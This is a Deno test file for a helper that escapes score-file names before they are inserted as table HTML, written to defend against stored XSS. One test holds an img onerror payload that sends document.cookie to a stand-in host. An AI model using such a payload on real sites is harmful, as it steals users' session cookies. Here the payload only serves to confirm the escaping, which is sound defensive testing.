// Tests for the score-list file-name render helper (issue #103).
//
// The `file` field rendered by docs/list.js originates from the untrusted
// scores/index.json. DataTables inserts a render callback's `display` return
// value as cell HTML, so the value must be HTML-escaped to prevent stored/DOM
// XSS. These tests exercise the real shipped helper.
import { assert, assertEquals } from "@std/assert";
import "../docs/escape.js";
import "../docs/list_render.js";

const g = globalThis as unknown as {
  renderScoreFileName: (file: unknown) => string;
};
const renderScoreFileName = g.renderScoreFileName;

Deno.test("list_render.js publishes renderScoreFileName on globalThis", () => {
  assertEquals(typeof renderScoreFileName, "function");
});

Deno.test("renderScoreFileName strips the .tsv suffix", () => {
  assertEquals(renderScoreFileName("2024-01-01.tsv"), "2024-01-01");
});

Deno.test("renderScoreFileName escapes an img onerror payload in the filename", () => {
  const payload = `<img src=x onerror=fetch('//evil/'+document.cookie)>.tsv`;
  const rendered = renderScoreFileName(payload);
  // No raw angle brackets survive, so the browser cannot build an element.
  assert(!rendered.includes("<"));
  assert(!rendered.includes(">"));
  assert(rendered.startsWith("&lt;img"));
});

Deno.test("renderScoreFileName escapes all HTML metacharacters", () => {
  assertEquals(renderScoreFileName(`<>&"'`), "&lt;&gt;&amp;&quot;&#39;");
});

Deno.test("renderScoreFileName leaves an ordinary filename untouched", () => {
  assertEquals(renderScoreFileName("scores-report"), "scores-report");
});

Deno.test("renderScoreFileName returns empty string for null/undefined", () => {
  assertEquals(renderScoreFileName(null), "");
  assertEquals(renderScoreFileName(undefined), "");
});
